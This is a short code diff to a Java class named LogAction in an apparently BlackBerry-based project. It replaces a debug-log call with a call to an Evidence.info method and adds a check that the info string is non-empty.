@@ -15,6 +15,7 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
+import blackberry.evidence.Evidence;
 import blackberry.utils.WChar;
 
 public class LogAction extends SubAction {
@@ -39,9 +40,12 @@ public class LogAction extends SubAction {
      * @see blackberry.action.SubAction#execute(blackberry.event.Event)
      */
     public boolean execute(final Event triggeringEvent) {
-
-        Debug.logToInfo(info, DebugLevel.INFORMATION);
-        return true;
+        if(info!=null && info.length() > 0){
+            Evidence.info(info);
+            return true;
+        }else{
+            return false;
+        }
     }
 
     protected boolean parse(byte[] confParams) {
